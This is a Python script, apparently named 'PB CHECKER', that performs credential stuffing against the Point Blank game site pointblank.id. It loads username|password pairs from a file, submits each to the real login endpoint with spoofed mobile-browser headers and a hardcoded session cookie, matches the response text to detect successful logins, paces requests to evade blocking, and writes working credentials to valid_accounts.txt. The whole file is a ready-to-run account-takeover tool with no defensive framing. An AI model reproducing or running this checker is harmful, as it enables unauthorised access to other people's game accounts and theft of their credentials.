import requests
import os
import sys
import time,re
from urllib.parse import urlencode
from time import sleep

def check_accounts():
    # Konfigurasi
    wm()
    ACCOUNT_FILE = 'akun.txt'
    VALID_FILE = 'valid_accounts.txt'
    LOG_FILE = 'login_log.txt'
    DELAY = 1  # Delay antar request dalam detik
    ses = 'NDQ3MGQ1MzQtZTc5Ny00OTE5LWI3MmItMTdmMzUzN2U5N2Ix'
    
    # Header dan cookies dari request original
    cookies = {
        'SESSION': ses,
        'landingPass': '1',
        'refer': '"https://www.pointblank.id/"',
    }

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.pointblank.id',
        'Referer': 'https://www.pointblank.id/login/form',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    try:
        # Baca file akun
        with open(ACCOUNT_FILE, 'r', encoding='utf-8') as f:
            accounts = [line.strip().split('|') for line in f if line.strip()]
            
        print(f" ! : Loaded {len(accounts)} accounts to check...")

        # Buka file log dan valid
        valid_count = 0
        with open(VALID_FILE, 'a', encoding='utf-8') as valid_f, \
             open(LOG_FILE, 'a', encoding='utf-8') as log_f:

            for idx, (userid, password) in enumerate(accounts, 1):
                try:
                    # Membuat payload
                    data = {
                        'loginFail': '0',
                        'userid': userid,
                        'password': password
                    }

                    # Kirim request
                    response = requests.post(
                        'https://www.pointblank.id/login/process',
                        cookies=cookies,
                        headers=headers,
                        data=data,
                        allow_redirects=False  # Penting untuk cek redirect
                    )

                    # Analisis response
                    response_text = response.text
                    status = "INVALID"
                    if (re.search(r'alert\("Data login yang anda masukan tidak sesuai\."\)', response_text) and
                        re.search(r'document\.location\.replace\("/login/form"\)', response_text)):
                        status = "INVALID"
                        
                    elif re.search(r'document\.location\.replace\("https://www\.pointblank\.id/"\)', response_text):
                        status = "VALID"
                        #valid_f.write(f"{userid}|{password}\n")
                        valid_f.write(f"{userid}|{password}\n")
                        valid_count += 1

                    # Log hasil
                    log_msg = f"[{idx}/{len(accounts)}]\033[1;32m {status} - {userid}:{password}\033[0m | Status: {response.status_code}"
                    print(log_msg)
                    log_f.write(log_msg + "\n")

                except Exception as e:
                    error_msg = f"Error checking {userid}: {str(e)}"
                    print(error_msg)
                    log_f.write(error_msg + "\n")

                # Delay untuk menghindari blocking
                time.sleep(DELAY)

        print(f"\nChecking completed! Valid accounts: {valid_count}")
        print(f"Valid accounts saved to: {VALID_FILE}")
        print(f"Full log saved to: {LOG_FILE}")

    except FileNotFoundError:
        print(f"Error: File {ACCOUNT_FILE} tidak ditemukan!")
    except Exception as e:
        print(f"Error: {str(e)}")
        


def wm():
    # Bersihkan layar secara cross-platform
    os.system('cls' if os.name == 'nt' else 'clear')
        
    
    # ASCII Art dengan style tambahan
    banner = """
\033[1;36m
  ___ ___    ___ _  _ ___ ___ _  _____ ___ 
 | _ \ _ )  / __| || | __/ __| |/ / __| _ \\
 |  _/ _ \ | (__| __ | _| (__| ' <| _||   /
 |_| |___/  \___|_||_|___\___|_|\_\___|_|_\\

\033[1;35m•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•
\033[1;32mTelegram: \033[4mhttps://t.me/ZT27S\033[0m 
\033[1;32mGithub: \033[4mhttps://github.com/4LIF27\033[0m
\033[1;35m•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•◈•\033[0m"""
    print(banner)
    
    sleep(0.5)

if __name__ == "__main__":
    check_accounts()
